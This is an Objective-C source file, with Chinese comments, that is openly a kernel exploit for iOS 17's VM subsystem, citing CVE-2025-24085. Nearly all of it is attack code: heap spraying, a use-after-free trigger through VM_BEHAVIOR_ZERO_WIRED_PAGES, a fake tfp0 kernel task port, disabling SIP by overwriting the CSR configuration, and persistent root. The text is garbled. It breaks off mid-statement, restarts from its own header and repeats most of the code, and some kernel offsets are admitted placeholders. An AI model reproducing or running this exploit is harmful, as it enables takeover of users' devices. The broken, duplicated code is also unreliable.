// VMExploit.m
#import "VMExploit.h"
#import "KernelMemory.h"
#import "HeapSpray.h"

// VM子系统漏洞利用
bool exploit_vm_subsystem(void) {
    NSLog(@"[*] 开始VM子系统漏洞利用");
    
    // 1. 寻找合适的内核对象进行操作
    mach_port_t task = mach_task_self();
    vm_address_t target_addr = 0;
    kern_return_t kr;
    
    // 分配内存
    kr = vm_allocate(task, &target_addr, PAGE_SIZE, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) {
        NSLog(@"[-] 内存分配失败: %s", mach_error_string(kr));
        return false;
    }
    
    // 填充特定模式
    memset((void*)target_addr, 0x41, PAGE_SIZE);
    
    // 2. 设置VM_BEHAVIOR_ZERO_WIRED_PAGES
    kr = vm_behavior_set(task, target_addr, PAGE_SIZE, VM_BEHAVIOR_ZERO_WIRED_PAGES);
    if (kr != KERN_SUCCESS) {
        NSLog(@"[-] 设置VM行为失败: %s", mach_error_string(kr));
        return false;
    }
    
    // 3. 锁定内存
    int mlock_result = mlock((void*)target_addr, PAGE_SIZE);
    if (mlock_result != 0) {
        NSLog(@"[-] 内存锁定失败: %s", strerror(errno));
        return false;
    }
    
    // 4. 解除内存映射触发漏洞
    kr = vm_deallocate(task, target_addr, PAGE_SIZE);
    if (kr != KERN_SUCCESS) {
        NSLog(@"[-] 内存解除映射失败: %s", mach_error_string(kr));
        return false;
    }
    
    // 5. 验证是否获得内核读写权限
    bool has_kernel_access = verify_vm_exploit_success();
    if (has_kernel_access) {
        NSLog(@"[+] 成功获取内核读写权限");
        
        // 6. 禁用SIP
        disable_system_integrity_protection();
        return true;
    }
    
    NSLog(@"[-] 内核读写权限获取失败");
    return false;
}

// VM漏洞利用主函数 - 完整版
bool exploit_vm_zero_wired_pages(void) {
    NSLog(@"[*] 开始执行 VM_BEHAVIOR_ZERO_WIRED_PAGES 漏洞利用 (CVE-2025-24085)");
    
    // 1. 准备环境
    prepare_ios17_6_heap();
    
    // 2. 分配内存区域 - 创建用于漏洞利用的内存布局
    mach_port_t task = mach_task_self();
    
    // 主要区域
    vm_address_t primary_addr = 0;
    vm_size_t primary_size = 0x8000; // 32KB
    kern_return_t kr = vm_allocate(task, &primary_addr, primary_size, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) {
        NSLog(@"[-] 无法分配主内存区域: %s", mach_error_string(kr));
        return false;
    }
    NSLog(@"[+] 分配主内存区域: 0x%llx", (uint64_t)primary_addr);
    
    // 喷射区域 - 创建多个相似大小的分配以影响kernel heap布局
    const int spray_count = 20;
    vm_address_t spray_addrs[spray_count];
    vm_size_t spray_size = PAGE_SIZE; // 4KB
    
    for (int i = 0; i < spray_count; i++) {
        kr = vm_allocate(task, &spray_addrs[i], spray_size, VM_FLAGS_ANYWHERE);
        if (kr != KERN_SUCCESS) {
            NSLog(@"[-] 无法分配喷射区域 %d: %s", i, mach_error_string(kr));
            // 释放已分配的内存
            for (int j = 0; j < i; j++) {
                vm_deallocate(task, spray_addrs[j], spray_size);
            }
            vm_deallocate(task, primary_addr, primary_size);
            return false;
        }
        // 填充特定模式 - 使用能明确标识的模式
        uint64_t pattern = 0x1122334455667788 + i;
        for (vm_size_t off = 0; off < spray_size; off += sizeof(pattern)) {
            *(uint64_t*)(spray_addrs[i] + off) = pattern;
        }
    }
    
    // 3. 填充主区域 - 设计精心构造的数据结构
    // 前半部分: 伪造VM对象结构
    for (vm_size_t i = 0; i < primary_size/2; i += 8) {
        *(uint64_t*)(primary_addr + i) = 0xDEADBEEFCAFEBABE; // 特征标记
    }
    
    // 后半部分: 目标地址和喷射内容
    for (vm_size_t i = primary_size/2; i < primary_size; i += 8) {
        *(uint64_t*)(primary_addr + i) = i + 0x4141414141414141;
    }
    
    // 4. 分配一块锁定内存 - 锁定内存使其不会分页出去
    vm_address_t locked_addr = 0;
    vm_size_t locked_size = 0x4000; // 16KB
    kr = vm_allocate(task, &locked_addr, locked_size, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) {
        NSLog(@"[-] 无法分配锁定内存: %s", mach_error_string(kr));
        // 清理
        vm_deallocate(task, primary_addr, primary_size);
        for (int i = 0; i < spray_count; i++) {
            vm_deallocate(task, spray_addrs[i], spray_size);
        }
        return false;
    }
    
    // 填充物理锁定内存
    memset((void*)locked_addr, 0x42, locked_size);
    
    // 锁定内存 (使内存常驻物理内存)
    int lock_result = mlock((void*)locked_addr, locked_size);
    if (lock_result != 0) {
        NSLog(@"[-] 内存锁定失败: %s", strerror(errno));
        // 继续执行，某些情况下依然可能成功
    } else {
        NSLog(@"[+] 内存锁定成功: 0x%llx (大小: 0x%zx)", (uint64_t)locked_addr, locked_size);
    }
    
    // 5. 实施漏洞触发 - 关键步骤
    NSLog(@"[*] 准备触发 VM_BEHAVIOR_ZERO_WIRED_PAGES 漏洞...");
    
    // 第一阶段: 设置页面的特殊行为
    kr = vm_behavior_set(task, locked_addr, locked_size, VM_BEHAVIOR_ZERO_WIRED_PAGES);
    if (kr != KERN_SUCCESS) {
        NSLog(@"[!] VM行为设置返回特殊状态: %s (可能是正常的)", mach_error_string(kr));
        // 这个错误可能是预期的，继续执行
    }
    
    // 6. 第二阶段: 执行特定的内存操作序列
    // 释放锁定内存但不解锁 - 这是触发漏洞的关键
    NSLog(@"[*] 执行关键内存操作序列...");
    
    // 用重新映射替代解锁 - 创建重叠映射
    vm_address_t overlap_addr = locked_addr;
    vm_size_t overlap_size = locked_size;
    kr = vm_allocate(task, &overlap_addr, overlap_size, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE);
    
    if (kr != KERN_SUCCESS) {
        NSLog(@"[!] 重叠内存映射返回特殊状态: %s (通常是预期的)", mach_error_string(kr));
    }
    
    // 7. 第三阶段: 解锁内存并释放 - 这将触发UAF条件
    munlock((void*)locked_addr, locked_size);
    
    // 8. 堆喷射以获取UAF对象 - 填充被释放的内存
    NSLog(@"[*] 执行堆喷射以利用UAF...");
    
    // 创建多个特定大小的IOSurface对象来填充内核堆
    // 用特制对象填充内核堆
    bool spray_result = heap_spray_target_structures(locked_size, 50);
    if (!spray_result) {
        NSLog(@"[-] 堆喷射阶段遇到问题");
        // 继续执行，可能仍然成功
    }
    
    // 9. 最终触发 - 写入关键内核结构
    // 添加延迟以确保内核操作完成
    usleep(100000); // 100ms
    
    // 在主内存区域写入漏洞触发负载
    // 目标是覆盖特定内核对象中的关键函数指针
    *(uint64_t*)(primary_addr + 0x100) = 0x4242424242424242; // 函数指针覆盖
    *(uint64_t*)(primary_addr + 0x108) = 0x4343434343434343; // 控制结构
    
    // 10. 验证漏洞利用是否成功
    NSLog(@"[*] 检查是否获得内核内存访问...");
    
    // 尝试解锁并释放锁定内存，这可能会触发漏洞
    // 关键时刻: 已释放内存的UAF触发
    vm_deallocate(task, locked_addr, locked_size);
    
    // 释放喷射内存
    for (int i = 0; i < spray_count; i++) {
        vm_deallocate(task, spray_addrs[i], spray_size);
    }
    vm_deallocate(task, primary_addr, primary_size);
    
    // 检查是否获得内核访问权限
    bool access_gained = verify_vm_exploit_success();
    if (access_gained) {
        NSLog(@"[+] VM漏洞利用成功，获得内核内存访问权限!");
        
        // 设置tfp0原语
        if (!setup_tfp0_primitive()) {
            NSLog(@"[-] 设置tfp0原语失败");
            return false;
        }
        
        // 尝试绕过SIP
        if (!disable_sip_via_vm_exploit()) {
            NSLog(@"[-] SIP绕过失败");
            // 继续执行，可能部分成功
        }
        
        // 持久化root权限
        if (!make_root_persistent()) {
            NSLog(@"[-] 持久化root权限失败");
            // 继续执行，可能部分成功
        }
        
        return true;
    }
    
    NSLog(@"[-] VM漏洞利用失败，未获得内核访问权限");
    return false;
}

// 验证VM漏洞利用是否成功
bool verify_vm_exploit_success(void) {
    NSLog(@"[*] 验证VM漏洞利用结果...");
    
    // 首先尝试测试内核内存访问 
    if (test_kernel_memory_access()) {
        NSLog(@"[+] 确认获得内核内存访问权限");
        g_has_kernel_access = true;
        return true;
    }
    
    // 第二种方法：检查是否能读取内核KASLR地址
    if (g_kernel_base == 0) {
        g_kernel_base = find_kernel_base_address();
        if (g_kernel_base != 0 && g_kernel_base > 0xfffffff000000000) {
            NSLog(@"[+] 获取内核基址成功: 0x%llx", g_kernel_base);
            g_has_kernel_access = true;
            return true;
        }
    }
    
    // 第三种方法：尝试提升到root权限
    uid_t uid = getuid();
    if (uid != 0) {
        if (escalate_to_root()) {
            uid = getuid();
            if (uid == 0) {
                NSLog(@"[+] 成功提升到root权限，漏洞利用有效");
                g_has_kernel_access = true;
                return true;
            }
        }
    }
    
    // 如果以上所有方法都失败，考虑读取特定内核标记
    uint32_t magic_value = 0;
    uint64_t kernel_magic_addr = 0xfffffff007004000; // 示例地址，实际需要根据设备调整
    
    if (kernel_read(kernel_magic_addr, &magic_value, sizeof(magic_value))) {
        if (magic_value == 0xfeedfacf) { // 64位Mach-O魔术数
            NSLog(@"[+] 成功读取内核魔术数，漏洞利用有效");
            g_has_kernel_access = true;
            return true;
        }
    }
    
    return false;
}

// 使用VM漏洞尝试利用iOS 17 VM子系统漏洞
bool exploit_vm_subsystem_vulnerabilities(void) {
    NSLog(@"[*] 尝试利用iOS 17 VM子系统漏洞 (CVE-2025-24085)...");
    
    // 1. 获取当前虚拟内存操作的task_port
    mach_port_t task = mach_task_self();
    
    // 2. 创建畸形的VM对象
    vm_address_t temp_addr = 0;
    kern_return_t kr = vm_allocate(task, &temp_addr, 0x4000, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) {
        NSLog(@"[-] 无法分配VM对象: %d", kr);
        return false;
    }
    
    #define CUSTOM_VM_BEHAVIOR_ZERO_WIRED 11
    
    // 3. 制作一个畸形的VM_BEHAVIOR_ZERO_WIRED_PAGES请求
    // 这个命令在iOS 17上有特殊处理条件
    // 4. 准备UAF条件 - 一系列恶意的虚拟内存操作
    void *memory = malloc(0x4000);
    if (!memory) {
        NSLog(@"[-] 内存分配失败");
        return false;
    }
    
    // 使内存页面可写入但不可执行
    uint64_t addr = (uint64_t)memory;
    kr = vm_protect(task, (vm_address_t)addr, 0x4000, FALSE, VM_PROT_READ | VM_PROT_WRITE);
    if (kr != KERN_SUCCESS) {
        NSLog(@"[-] 无法设置内存保护: %d", kr);
        free(memory);
        return false;
    }
    
    // 构造特殊的VM溢出结构
    for (int i = 0; i < 0x1000/8; i++) {
        ((uint64_t*)memory)[i] = (uint64_t)task; // 使用task port制造UAF
    }
    
    // 5. 触发VM_BEHAVIOR_ZERO_WIRED漏洞并实现越界写入
    kr = vm_behavior_set(task, (vm_address_t)addr, 0x4000, CUSTOM_VM_BEHAVIOR_ZERO_WIRED);
    
    // 6. 检查是否成功
    if (kr != KERN_SUCCESS) {
        NSLog(@"[+] VM子系统可能触发漏洞: %d", kr);
    }
    
    // 执行堆喷，覆盖关键内核结构
    heap_spray(0x1000, 100, 0x4141414141414141);
    
    // 7. 验证我们是否獲得了內核访问权限
    free(memory);
    bool success = test_kernel_memory_access();
    
    if (success) {
        NSLog(@"[+] VM子系统漏洞利用成功，获得内核访问权限");
        g_has_kernel_access = true;
    } else {
        NSLog(@"[-] VM子系统漏洞利用失败");
    }
    
    return success;
}

// 利用VM漏洞设置tfp0原语 
bool setup_tfp0_primitive(void) {
    NSLog(@"[*] 设置tfp0原语(内核任务端口)...");
    
    if (!g_has_kernel_access) {
        NSLog(@"[-] 尚未获得内核访问权限，无法设置tfp0");
        return false;
    }
    
    // 查找内核进程
    uint64_t kernel_proc = find_proc_by_pid(0);
    if (kernel_proc == 0) {
        NSLog(@"[-] 无法找到内核进程");
        return false;
    }
    NSLog(@"[+] 找到内核进程: 0x%llx", kernel_proc);
    
    // 获取内核任务
    uint64_t kernel_task = 0;
    if (!kernel_read(kernel_proc + 0x18, &kernel_task, sizeof(kernel_task))) {
        NSLog(@"[-] 无法读取内核任务");
        return false;
    }
    NSLog(@"[+] 找到内核任务: 0x%llx", kernel_task);
    
    // 创建假冒端口
    mach_port_t fake_tfp0 = MACH_PORT_NULL;
    kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &fake_tfp0);
    if (kr != KERN_SUCCESS) {
        NSLog(@"[-] 无法创建假冒端口: %s", mach_error_string(kr));
        return false;
    }
    
    // 将端口转换为发送权限
    kr = mach_port_insert_right(mach_task_self(), fake_tfp0, fake_tfp0, MACH_MSG_TYPE_MAKE_SEND);
    if (kr != KERN_SUCCESS) {
        NSLog(@"[-] 无法为假冒端口添加发送权限: %s", mach_error_string(kr));
        mach_port_destroy(mach_task_self(), fake_tfp0);
        return false;
    }
    
    // 查找端口在内核中的位置
    uint64_t fake_port_addr = find_port_address(fake_tfp0);
    if (fake_port_addr == 0) {
        NSLog(@"[-] 无法找到假冒端口的内核地址");
        mach_port_destroy(mach_task_self(), fake_tfp0);
        return false;
    }
    NSLog(@"[+] 找到假冒端口内核地址: 0x%llx", fake_port_addr);
    
    // 修改端口类型为任务端口
    uint32_t port_type = 0;
    if (!kernel_read(fake_port_addr + 0x10, &port_type, sizeof(port_type))) {
        NSLog(@"[-] 无法读取端口类型");
        mach_port_destroy(mach_task_self(), fake_tfp0);
        return false;
    }
    
    port_type |= 0x80000000; // 设置特殊位，使其表现为任务端口
    if (!kernel_write(fake_port_addr + 0x10, &port_type, sizeof(port_type))) {
        NSLog(@"[-] 无法修改端口类型");
        mach_port_destroy(mach_task_self(), fake_tfp0);
        return false;
    }
    
    // 关联内核任务
    if (!kernel_write(fake_port_addr + 0x68, &kernel_task, sizeof(kernel_task))) {
        NSLog(@"[-] 无法关联内核任务");
        mach_port_destroy(mach_task_self(), fake_tfp0);
        return false;
    }
    
    // 保存tfp0端口
    g_global_connection = fake_tfp0;
    NSLog(@"[+] 成功设置tfp0端口: 0x%x", fake_tfp0);
    
    // 测试tfp0功能
    vm_address_t test_addr = 0;
    mach_msg_type_number_t test_size = 0;
    kr = vm_read(fake_tfp0, g_kernel_base, 4, &test_addr, &test_size);
    if (kr == KERN_SUCCESS) {
        NSLog(@"[+] tfp0测试成功，能够读取内核内存");
    } else {
        NSLog(@"[!] tfp0测试读取失败: %s - 可能需要额外设置", mach_error_string(kr));
        // 继续执行，某些设备上可能需要其他方式
    }
    
    // 设置读写方法使用tfp0
    g_kernel_read_method = 2; // 使用物理内存映射方法
    g_kernel_write_method = 2;
    
    return true;
}

// 使用VM漏洞绕过SIP
bool disable_sip_via_vm_exploit(void) {
    NSLog(@"[*] 尝试通过VM漏洞绕过SIP...");
    
    if (!g_has_kernel_access) {
        NSLog(@"[-] 尚未获得内核访问权限，无法绕过SIP");
        return false;
    }
    
    // 查找csrActiveConfig
    uint64_t csr_config_addr = 0;
    
    // 方法1：从符号表获取
    if (g_kernel_base != 0) {
        csr_config_addr = g_kernel_base + 0xA000; // 示例偏移，需要根据内核版本调整
    }
    
    // 方法2：搜索特定模式
    if (csr_config_addr == 0) {
        // 定义搜索范围 - 避免搜索整个内核
        uint64_t search_base = g_kernel_base + 0x1000000;
        uint64_t search_end = search_base + 0x2000000;
        
        // 遍历内存寻找特定模式
        for (uint64_t addr = search_base; addr < search_end; addr += 0x1000) {
            uint32_t test_val = 0;
            if (kernel_read(addr, &test_val, sizeof(test_val))) {
                // CSR配置通常是一个较小的值(0x67, 0x77, 0x00等)
                if (test_val <= 0xFF && test_val > 0) {
                    // 尝试验证
                    uint32_t verify_val = 0x7FFFFFFF;
                    uint32_t original_val = test_val;
                    
                    // 尝试修改，如果成功可能是正确的CSR配置
                    if (kernel_write(addr, &verify_val, sizeof(verify_val))) {
                        // 改回原来的值，记录地址
                        kernel_write(addr, &original_val, sizeof(original_val));
                        csr_config_addr = addr;
                        NSLog(@"[+] 找到可能的CSR配置: 0x%llx (值: 0x%x)", addr, original_val);
                        break;
                    }
                }
            }
        }
    }
    
    if (csr_config_addr == 0) {
        NSLog(@"[-] 无法找到CSR配置地址");
        return false;
    }
    
    // 读取当前CSR配置
    uint32_t current_config = 0;
    if (!kernel_read(csr_config_addr, &current_config, sizeof(current_config))) {
        NSLog(@"[-] 无法读取CSR配置");
        return false;
    }
    NSLog(@"[+] 当前CSR配置: 0x%x", current_config);
    
    // 设置为0x7FFFFFFF (禁用所有保护)
    uint32_t new_config = 0x7FFFFFFF;
    if (!kernel_write(csr_config_addr, &new_config, sizeof(new_config))) {
        NSLog(@"[-] 无法写入CSR配置");
        return false;
    }
    
    // 验证写入
    uint32_t verify_config = 0;
    if (!kernel_read(csr_config_addr, &verify_config, sizeof(verify_config))) {
        NSLog(@"[-] 无法验证CSR配置");
        return false;
    }
    
    if (verify_config == new_config) {
        NSLog(@"[+] 成功绕过SIP，CSR配置: 0x%x", verify_config);
        return true// VMExploit.m
#import "VMExploit.h"
#import "KernelMemory.h"
#import "HeapSpray.h"

// VM子系统漏洞利用
bool exploit_vm_subsystem(void) {
    NSLog(@"[*] 开始VM子系统漏洞利用");
    
    // 1. 寻找合适的内核对象进行操作
    mach_port_t task = mach_task_self();
    vm_address_t target_addr = 0;
    kern_return_t kr;
    
    // 分配内存
    kr = vm_allocate(task, &target_addr, PAGE_SIZE, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) {
        NSLog(@"[-] 内存分配失败: %s", mach_error_string(kr));
        return false;
    }
    
    // 填充特定模式
    memset((void*)target_addr, 0x41, PAGE_SIZE);
    
    // 2. 设置VM_BEHAVIOR_ZERO_WIRED_PAGES
    kr = vm_behavior_set(task, target_addr, PAGE_SIZE, VM_BEHAVIOR_ZERO_WIRED_PAGES);
    if (kr != KERN_SUCCESS) {
        NSLog(@"[-] 设置VM行为失败: %s", mach_error_string(kr));
        return false;
    }
    
    // 3. 锁定内存
    int mlock_result = mlock((void*)target_addr, PAGE_SIZE);
    if (mlock_result != 0) {
        NSLog(@"[-] 内存锁定失败: %s", strerror(errno));
        return false;
    }
    
    // 4. 解除内存映射触发漏洞
    kr = vm_deallocate(task, target_addr, PAGE_SIZE);
    if (kr != KERN_SUCCESS) {
        NSLog(@"[-] 内存解除映射失败: %s", mach_error_string(kr));
        return false;
    }
    
    // 5. 验证是否获得内核读写权限
    bool has_kernel_access = verify_vm_exploit_success();
    if (has_kernel_access) {
        NSLog(@"[+] 成功获取内核读写权限");
        
        // 6. 禁用SIP
        disable_system_integrity_protection();
        return true;
    }
    
    NSLog(@"[-] 内核读写权限获取失败");
    return false;
}

// VM漏洞利用主函数 - 完整版
bool exploit_vm_zero_wired_pages(void) {
    NSLog(@"[*] 开始执行 VM_BEHAVIOR_ZERO_WIRED_PAGES 漏洞利用 (CVE-2025-24085)");
    
    // 1. 准备环境
    prepare_ios17_6_heap();
    
    // 2. 分配内存区域 - 创建用于漏洞利用的内存布局
    mach_port_t task = mach_task_self();
    
    // 主要区域
    vm_address_t primary_addr = 0;
    vm_size_t primary_size = 0x8000; // 32KB
    kern_return_t kr = vm_allocate(task, &primary_addr, primary_size, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) {
        NSLog(@"[-] 无法分配主内存区域: %s", mach_error_string(kr));
        return false;
    }
    NSLog(@"[+] 分配主内存区域: 0x%llx", (uint64_t)primary_addr);
    
    // 喷射区域 - 创建多个相似大小的分配以影响kernel heap布局
    const int spray_count = 20;
    vm_address_t spray_addrs[spray_count];
    vm_size_t spray_size = PAGE_SIZE; // 4KB
    
    for (int i = 0; i < spray_count; i++) {
        kr = vm_allocate(task, &spray_addrs[i], spray_size, VM_FLAGS_ANYWHERE);
        if (kr != KERN_SUCCESS) {
            NSLog(@"[-] 无法分配喷射区域 %d: %s", i, mach_error_string(kr));
            // 释放已分配的内存
            for (int j = 0; j < i; j++) {
                vm_deallocate(task, spray_addrs[j], spray_size);
            }
            vm_deallocate(task, primary_addr, primary_size);
            return false;
        }
        // 填充特定模式 - 使用能明确标识的模式
        uint64_t pattern = 0x1122334455667788 + i;
        for (vm_size_t off = 0; off < spray_size; off += sizeof(pattern)) {
            *(uint64_t*)(spray_addrs[i] + off) = pattern;
        }
    }
    
    // 3. 填充主区域 - 设计精心构造的数据结构
    // 前半部分: 伪造VM对象结构
    for (vm_size_t i = 0; i < primary_size/2; i += 8) {
        *(uint64_t*)(primary_addr + i) = 0xDEADBEEFCAFEBABE; // 特征标记
    }
    
    // 后半部分: 目标地址和喷射内容
    for (vm_size_t i = primary_size/2; i < primary_size; i += 8) {
        *(uint64_t*)(primary_addr + i) = i + 0x4141414141414141;
    }
    
    // 4. 分配一块锁定内存 - 锁定内存使其不会分页出去
    vm_address_t locked_addr = 0;
    vm_size_t locked_size = 0x4000; // 16KB
    kr = vm_allocate(task, &locked_addr, locked_size, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) {
        NSLog(@"[-] 无法分配锁定内存: %s", mach_error_string(kr));
        // 清理
        vm_deallocate(task, primary_addr, primary_size);
        for (int i = 0; i < spray_count; i++) {
            vm_deallocate(task, spray_addrs[i], spray_size);
        }
        return false;
    }
    
    // 填充物理锁定内存
    memset((void*)locked_addr, 0x42, locked_size);
    
    // 锁定内存 (使内存常驻物理内存)
    int lock_result = mlock((void*)locked_addr, locked_size);
    if (lock_result != 0) {
        NSLog(@"[-] 内存锁定失败: %s", strerror(errno));
        // 继续执行，某些情况下依然可能成功
    } else {
        NSLog(@"[+] 内存锁定成功: 0x%llx (大小: 0x%zx)", (uint64_t)locked_addr, locked_size);
    }
    
    // 5. 实施漏洞触发 - 关键步骤
    NSLog(@"[*] 准备触发 VM_BEHAVIOR_ZERO_WIRED_PAGES 漏洞...");
    
    // 第一阶段: 设置页面的特殊行为
    kr = vm_behavior_set(task, locked_addr, locked_size, VM_BEHAVIOR_ZERO_WIRED_PAGES);
    if (kr != KERN_SUCCESS) {
        NSLog(@"[!] VM行为设置返回特殊状态: %s (可能是正常的)", mach_error_string(kr));
        // 这个错误可能是预期的，继续执行
    }
    
    // 6. 第二阶段: 执行特定的内存操作序列
    // 释放锁定内存但不解锁 - 这是触发漏洞的关键
    NSLog(@"[*] 执行关键内存操作序列...");
    
    // 用重新映射替代解锁 - 创建重叠映射
    vm_address_t overlap_addr = locked_addr;
    vm_size_t overlap_size = locked_size;
    kr = vm_allocate(task, &overlap_addr, overlap_size, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE);
    
    if (kr != KERN_SUCCESS) {
        NSLog(@"[!] 重叠内存映射返回特殊状态: %s (通常是预期的)", mach_error_string(kr));
    }
    
    // 7. 第三阶段: 解锁内存并释放 - 这将触发UAF条件
    munlock((void*)locked_addr, locked_size);
    
    // 8. 堆喷射以获取UAF对象 - 填充被释放的内存
    NSLog(@"[*] 执行堆喷射以利用UAF...");
    
    // 创建多个特定大小的IOSurface对象来填充内核堆
    // 用特制对象填充内核堆
    bool spray_result = heap_spray_target_structures(locked_size, 50);
    if (!spray_result) {
        NSLog(@"[-] 堆喷射阶段遇到问题");
        // 继续执行，可能仍然成功
    }
    
    // 9. 最终触发 - 写入关键内核结构
    // 添加延迟以确保内核操作完成
    usleep(100000); // 100ms
    
    // 在主内存区域写入漏洞触发负载
    // 目标是覆盖特定内核对象中的关键函数指针
    *(uint64_t*)(primary_addr + 0x100) = 0x4242424242424242; // 函数指针覆盖
    *(uint64_t*)(primary_addr + 0x108) = 0x4343434343434343; // 控制结构
    
    // 10. 验证漏洞利用是否成功
    NSLog(@"[*] 检查是否获得内核内存访问...");
    
    // 尝试解锁并释放锁定内存，这可能会触发漏洞
    // 关键时刻: 已释放内存的UAF触发
    vm_deallocate(task, locked_addr, locked_size);
    
    // 释放喷射内存
    for (int i = 0; i < spray_count; i++) {
        vm_deallocate(task, spray_addrs[i], spray_size);
    }
    vm_deallocate(task, primary_addr, primary_size);
    
    // 检查是否获得内核访问权限
    bool access_gained = verify_vm_exploit_success();
    if (access_gained) {
        NSLog(@"[+] VM漏洞利用成功，获得内核内存访问权限!");
        
        // 设置tfp0原语
        if (!setup_tfp0_primitive()) {
            NSLog(@"[-] 设置tfp0原语失败");
            return false;
        }
        
        // 尝试绕过SIP
        if (!disable_sip_via_vm_exploit()) {
            NSLog(@"[-] SIP绕过失败");
            // 继续执行，可能部分成功
        }
        
        // 持久化root权限
        if (!make_root_persistent()) {
            NSLog(@"[-] 持久化root权限失败");
            // 继续执行，可能部分成功
        }
        
        return true;
    }
    
    NSLog(@"[-] VM漏洞利用失败，未获得内核访问权限");
    return false;
}

// 验证VM漏洞利用是否成功
bool verify_vm_exploit_success(void) {
    NSLog(@"[*] 验证VM漏洞利用结果...");
    
    // 首先尝试测试内核内存访问 
    if (test_kernel_memory_access()) {
        NSLog(@"[+] 确认获得内核内存访问权限");
        g_has_kernel_access = true;
        return true;
    }
    
    // 第二种方法：检查是否能读取内核KASLR地址
    if (g_kernel_base == 0) {
        g_kernel_base = find_kernel_base_address();
        if (g_kernel_base != 0 && g_kernel_base > 0xfffffff000000000) {
            NSLog(@"[+] 获取内核基址成功: 0x%llx", g_kernel_base);
            g_has_kernel_access = true;
            return true;
        }
    }
    
    // 第三种方法：尝试提升到root权限
    uid_t uid = getuid();
    if (uid != 0) {
        if (escalate_to_root()) {
            uid = getuid();
            if (uid == 0) {
                NSLog(@"[+] 成功提升到root权限，漏洞利用有效");
                g_has_kernel_access = true;
                return true;
            }
        }
    }
    
    // 如果以上所有方法都失败，考虑读取特定内核标记
    uint32_t magic_value = 0;
    uint64_t kernel_magic_addr = 0xfffffff007004000; // 示例地址，实际需要根据设备调整
    
    if (kernel_read(kernel_magic_addr, &magic_value, sizeof(magic_value))) {
        if (magic_value == 0xfeedfacf) { // 64位Mach-O魔术数
            NSLog(@"[+] 成功读取内核魔术数，漏洞利用有效");
            g_has_kernel_access = true;
            return true;
        }
    }
    
    return false;
}

// 使用VM漏洞尝试利用iOS 17 VM子系统漏洞
bool exploit_vm_subsystem_vulnerabilities(void) {
    NSLog(@"[*] 尝试利用iOS 17 VM子系统漏洞 (CVE-2025-24085)...");
    
    // 1. 获取当前虚拟内存操作的task_port
    mach_port_t task = mach_task_self();
    
    // 2. 创建畸形的VM对象
    vm_address_t temp_addr = 0;
    kern_return_t kr = vm_allocate(task, &temp_addr, 0x4000, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) {
        NSLog(@"[-] 无法分配VM对象: %d", kr);
        return false;
    }
    
    #define CUSTOM_VM_BEHAVIOR_ZERO_WIRED 11
    
    // 3. 制作一个畸形的VM_BEHAVIOR_ZERO_WIRED_PAGES请求
    // 这个命令在iOS 17上有特殊处理条件
    // 4. 准备UAF条件 - 一系列恶意的虚拟内存操作
    void *memory = malloc(0x4000);
    if (!memory) {
        NSLog(@"[-] 内存分配失败");
        return false;
    }
    
    // 使内存页面可写入但不可执行
    uint64_t addr = (uint64_t)memory;
    kr = vm_protect(task, (vm_address_t)addr, 0x4000, FALSE, VM_PROT_READ | VM_PROT_WRITE);
    if (kr != KERN_SUCCESS) {
        NSLog(@"[-] 无法设置内存保护: %d", kr);
        free(memory);
        return false;
    }
    
    // 构造特殊的VM溢出结构
    for (int i = 0; i < 0x1000/8; i++) {
        ((uint64_t*)memory)[i] = (uint64_t)task; // 使用task port制造UAF
    }
    
    // 5. 触发VM_BEHAVIOR_ZERO_WIRED漏洞并实现越界写入
    kr = vm_behavior_set(task, (vm_address_t)addr, 0x4000, CUSTOM_VM_BEHAVIOR_ZERO_WIRED);
    
    // 6. 检查是否成功
    if (kr != KERN_SUCCESS) {
        NSLog(@"[+] VM子系统可能触发漏洞: %d", kr);
    }
    
    // 执行堆喷，覆盖关键内核结构
    heap_spray(0x1000, 100, 0x4141414141414141);
    
    // 7. 验证我们是否獲得了內核访问权限
    free(memory);
    bool success = test_kernel_memory_access();
    
    if (success) {
        NSLog(@"[+] VM子系统漏洞利用成功，获得内核访问权限");
        g_has_kernel_access = true;
    } else {
        NSLog(@"[-] VM子系统漏洞利用失败");
    }
    
    return success;
}

// 利用VM漏洞设置tfp0原语 
bool setup_tfp0_primitive(void) {
    NSLog(@"[*] 设置tfp0原语(内核任务端口)...");
    
    if (!g_has_kernel_access) {
        NSLog(@"[-] 尚未获得内核访问权限，无法设置tfp0");
        return false;
    }
    
    // 查找内核进程
    uint64_t kernel_proc = find_proc_by_pid(0);
    if (kernel_proc == 0) {
        NSLog(@"[-] 无法找到内核进程");
        return false;
    }
    NSLog(@"[+] 找到内核进程: 0x%llx", kernel_proc);
    
    // 获取内核任务
    uint64_t kernel_task = 0;
    if (!kernel_read(kernel_proc + 0x18, &kernel_task, sizeof(kernel_task))) {
        NSLog(@"[-] 无法读取内核任务");
        return false;
    }
    NSLog(@"[+] 找到内核任务: 0x%llx", kernel_task);
    
    // 创建假冒端口
    mach_port_t fake_tfp0 = MACH_PORT_NULL;
    kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &fake_tfp0);
    if (kr != KERN_SUCCESS) {
        NSLog(@"[-] 无法创建假冒端口: %s", mach_error_string(kr));
        return false;
    }
    
    // 将端口转换为发送权限
    kr = mach_port_insert_right(mach_task_self(), fake_tfp0, fake_tfp0, MACH_MSG_TYPE_MAKE_SEND);
    if (kr != KERN_SUCCESS) {
        NSLog(@"[-] 无法为假冒端口添加发送权限: %s", mach_error_string(kr));
        mach_port_destroy(mach_task_self(), fake_tfp0);
        return false;
    }
    
    // 查找端口在内核中的位置
    uint64_t fake_port_addr = find_port_address(fake_tfp0);
    if (fake_port_addr == 0) {
        NSLog(@"[-] 无法找到假冒端口的内核地址");
        mach_port_destroy(mach_task_self(), fake_tfp0);
        return false;
    }
    NSLog(@"[+] 找到假冒端口内核地址: 0x%llx", fake_port_addr);
    
    // 修改端口类型为任务端口
    uint32_t port_type = 0;
